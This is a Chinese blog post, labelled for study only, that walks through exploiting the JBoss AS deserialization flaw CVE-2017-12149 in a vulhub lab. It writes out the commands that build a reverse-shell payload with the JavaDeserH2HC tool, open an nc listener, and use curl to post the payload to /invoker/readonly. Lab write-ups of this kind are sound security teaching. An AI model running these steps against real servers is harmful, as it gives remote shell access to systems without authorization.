# JBOSSAS 5.x/6.x 反序列化命令执行漏洞(CVE-2017-12149) - starnight_cyber - 博客园

> 原文：[`www.cnblogs.com/Hi-blog/p/7904443.html`](https://www.cnblogs.com/Hi-blog/p/7904443.html)

* * *

　　本文主要记录一下 JBOSSAS 5.x/6.x 反序列化命令执行漏洞的测试过程

仅供学习

* * *

　　文中利用到漏洞环境由[phith0n](https://github.com/phith0n)维护: [JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）](https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149)

　　靶机地址：192.168.1.102  服务端口:8080　　　　

　　测试机： 192.168.1.100

　　搭建好环境，访问地址：[`192.168.1.102:8080/`](http://192.168.1.102:8080/) 及 [`192.168.1.102:8080/invoker/readonly`](http://192.168.1.102:8080/invoker/readonly)

![](img/63fd7b347853b5ae8dd26dee8bb60243.png)  ![](img/c83784de0b572c64cbe29cb61b18d161.png)

　　响应码 500，证明漏洞存在。

　　下载漏洞利用工具： http://scan.javasec.cn/java/JavaDeserH2HC.zip

　　编译：（需要 java 环境）

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
```

　　运行：

```
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port 　　//反弹 shell 的 IP 和端口
```

```
starnight:JavaDeserH2HC starnight$ javac -cp .:commons-collections-3.2.1**.jar ReverseShellCommonsCollectionsHashMap.java**
starnight:JavaDeserH2HC starnight$ **java** -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.1.100:1337 Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser
```

　　这样就会将序列化对象保存在 ReverseShellCommonsCollectionsHashMap.ser 中，用 curl 命令发送到 Jboss 服务地址。

　　先在测试机运行 nc 命令，进入监听模式：

```
starnight:temp starnight$ nc -lvv 1337
```

　　再打开另一个控制台，运行如下 curl 命令：

```
starnight:JavaDeserH2HC starnight$ curl -v http://192.168.1.102:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

　　运行截图：

![](img/56b63e9ca60988da215fd508c35fa16d.png)

　　左侧是获取到 shell，并执行命令。右侧是用 curl 命令运行截图。

References

　　[JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）](https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149)

　　[CVE-2017-12149 JBOOS AS 6.X 反序列化漏洞利用](https://www.cnblogs.com/sevck/p/7874438.html#3851433)